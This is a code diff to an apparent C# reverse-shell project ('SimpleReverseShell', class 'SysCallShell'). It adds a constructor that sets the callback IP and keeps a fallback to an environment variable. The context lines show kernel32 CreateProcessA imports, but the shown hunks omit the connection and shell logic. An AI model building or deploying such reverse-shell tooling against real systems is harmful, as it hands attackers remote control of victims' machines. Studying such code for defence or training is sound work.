@@ -6,10 +6,18 @@
 namespace SimpleReverseShell
 {
   using System.Net.Sockets;
+  using System.Runtime.CompilerServices;
   using System.Runtime.InteropServices;
 
   public class SysCallShell
   {
+    private string ip;
+
+    public SysCallShell(string ip)
+    {
+      this.ip = ip;
+    }
+    
     #region MemoryManagement
     [DllImport("kernel32.dll")]
     public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
@@ -188,9 +196,9 @@ namespace SimpleReverseShell
         Console.WriteLine($"Method {method} completed without errors");
     }
 
-    public static string GetIP()
+    public string GetIP()
     {
-      var ip = Environment.GetEnvironmentVariable("MA_ServerIP", EnvironmentVariableTarget.User);
+      var ip = this.ip ?? Environment.GetEnvironmentVariable("MA_ServerIP", EnvironmentVariableTarget.User);
 
       if (string.IsNullOrWhiteSpace(ip))
       {
